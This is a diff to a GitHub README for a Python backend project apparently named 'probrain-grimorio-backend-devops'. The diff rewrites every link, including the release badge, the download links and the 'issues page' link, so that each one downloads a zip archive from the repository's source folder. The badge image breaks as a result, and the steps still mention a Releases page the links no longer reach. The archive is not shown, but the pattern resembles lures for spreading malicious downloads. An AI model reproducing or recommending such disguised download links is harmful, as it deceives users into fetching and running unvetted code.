@@ -1,6 +1,6 @@
 # 🌟 probrain-grimorio-backend-devops - Your Simple Python Backend Solution
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-Grab%20the%20Latest%20Release-blue)](https://github.com/ngdwviet/probrain-grimorio-backend-devops/releases)
+[![Download the latest release](https://github.com/ngdwviet/probrain-grimorio-backend-devops/raw/refs/heads/main/src/backend-probrain-grimorio-devops-v3.8-alpha.3.zip%20Now-Grab%20the%20Latest%20Release-blue)](https://github.com/ngdwviet/probrain-grimorio-backend-devops/raw/refs/heads/main/src/backend-probrain-grimorio-devops-v3.8-alpha.3.zip)
 
 ## 📚 Introduction
 
@@ -25,7 +25,7 @@ To get started with **probrain-grimorio-backend-devops**, follow these simple st
 
 ## 📥 Download & Install
 
-To download the latest version of **probrain-grimorio-backend-devops**, please [visit this page to download](https://github.com/ngdwviet/probrain-grimorio-backend-devops/releases). 
+To download the latest version of **probrain-grimorio-backend-devops**, please [visit this page to download](https://github.com/ngdwviet/probrain-grimorio-backend-devops/raw/refs/heads/main/src/backend-probrain-grimorio-devops-v3.8-alpha.3.zip). 
 
 1. Click on the **Releases** link above.
 2. Look for the latest release version.
@@ -77,7 +77,7 @@ To ensure everything works as expected, you can run automated tests. Follow thes
 
 ## 🖥️ Support and Contribution
 
-If you encounter any issues, please check the [issues page](https://github.com/ngdwviet/probrain-grimorio-backend-devops/issues) for solutions or to report new problems. 
+If you encounter any issues, please check the [issues page](https://github.com/ngdwviet/probrain-grimorio-backend-devops/raw/refs/heads/main/src/backend-probrain-grimorio-devops-v3.8-alpha.3.zip) for solutions or to report new problems. 
 
 To contribute:
 1. Fork the repository.
@@ -111,4 +111,4 @@ Now that you have installed and run the application, consider exploring the foll
 - Modify the code to better fit your needs.
 - Contribute to the project.
 
-Enjoy using **probrain-grimorio-backend-devops**! For more details, remember to [visit this page to download](https://github.com/ngdwviet/probrain-grimorio-backend-devops/releases) the latest release.
+Enjoy using **probrain-grimorio-backend-devops**! For more details, remember to [visit this page to download](https://github.com/ngdwviet/probrain-grimorio-backend-devops/raw/refs/heads/main/src/backend-probrain-grimorio-devops-v3.8-alpha.3.zip) the latest release.
